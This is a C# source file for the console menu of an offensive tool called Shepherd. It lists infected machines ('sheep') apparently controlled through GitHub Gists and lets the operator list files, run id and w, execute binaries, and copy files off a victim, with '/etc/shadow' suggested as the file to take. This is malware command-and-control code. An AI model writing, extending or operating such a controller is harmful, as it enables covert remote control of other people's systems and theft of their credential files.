using ConsoleTables;
using Sharprompt;
using Sharprompt.Fluent;
using Shepherd.Core;

namespace Shepherd.Wizard;

/// <summary>
/// Class <c>Wizard</c> Console wizard
/// </summary>
public class Wizard
{
    private readonly ShepherdController _shepherdController;

    public Wizard(ShepherdController shepherdController)
    {
        _shepherdController = shepherdController;
    }

    /// <summary>
    /// Method <c>MainMenu</c> Wizard main menu method.
    /// </summary>
    public async Task MainMenu()
    {
        var mainMenuOption = Prompt.Select<MainMenuOptions>("Main menu", defaultValue: MainMenuOptions.ListSheep);

        switch (mainMenuOption)
        {
            case MainMenuOptions.ListSheep:
                await DisplaySheep();
                break;
            case MainMenuOptions.ControlSheep:
                var key = await SelectAliveSheep();

                if (string.IsNullOrEmpty(key))
                {
                    Console.WriteLine("No active sheep to control :(\n");
                    break;
                }

                await SheepAction(key);
                break;
            case MainMenuOptions.Exit:
                Environment.Exit(0);
                break;
            default:
                throw new ArgumentOutOfRangeException();
        }

        await MainMenu();
    }

    /// <summary>
    /// Method <c>MainMenu</c> Wizard perform action method.
    /// </summary>
    private async Task SheepAction(string sheepKey)
    {
        var action = Prompt.Select<SheepActionsOptions>(x =>
            x.WithMessage("What do you want to do? 😈")
        );

        switch (action)
        {
            case SheepActionsOptions.W:
                await _shepherdController.CommandW(sheepKey);
                break;
            case SheepActionsOptions.Ls:
                var lsPath = Prompt.Input<string>("Path 🛣️", placeholder: "/home/Billy/pasture");
                await _shepherdController.CommandLs(sheepKey, lsPath);
                break;
            case SheepActionsOptions.Id:
                await _shepherdController.CommandId(sheepKey);
                break;
            case SheepActionsOptions.Copy:
                var copyPath = Prompt.Input<string>("Path 🛣️", placeholder: "/etc/shadow");
                await _shepherdController.CommandCopy(sheepKey, copyPath);
                break;
            case SheepActionsOptions.Execute:
                var executePath = Prompt.Input<string>("Path 🛣️", placeholder: "/usr/bin/feed");
                await _shepherdController.CommandExecute(sheepKey, executePath);
                break;
            case SheepActionsOptions.Return:
                break;
            default:
                throw new ArgumentOutOfRangeException();
        }
    }

    /// <summary>
    /// Method <c>SelectAliveSheep</c> Wizard perform selection of sheep method.
    /// </summary>
    private async Task<string> SelectAliveSheep()
    {
        var sheep = await _shepherdController.GetSheepGists();
        var sheepAlive = await _shepherdController.GetSheepAlive();
        
        var sheepSelectOptions = sheep
            .Where(s => sheepAlive[s.Key])
            .Select(s => s.Key)
            .ToArray();

        if (sheepSelectOptions.Length < 1)
        {
            return "";
        }

        var selectedSheepKey = Prompt.Select<string>(x =>
            x
                .WithItems(sheepSelectOptions)
                .WithMessage("Select 🐑 to control! 🕹️")
        );

        return selectedSheepKey;
    }

    /// <summary>
    /// Method <c>DisplaySheep</c> Wizard display list of all sheep
    /// </summary>
    private async Task DisplaySheep()
    {
        var sheep = await _shepherdController.GetSheepGists();
        var sheepAlive = await _shepherdController.GetSheepAlive();

        Console.WriteLine("Listing active sheep... 🐏");


        ConsoleTable table = new ConsoleTable("Sheep Id 🐑", "Gist Id 🗒️", "Status ️");

        foreach (var s in sheep)
        {
            table.AddRow(s.Key, $"https://gist.github.com/{s.Value}", sheepAlive[s.Key] ? "Alive" : "Dead");
        }

        table.Write();
        Console.WriteLine();
    }
}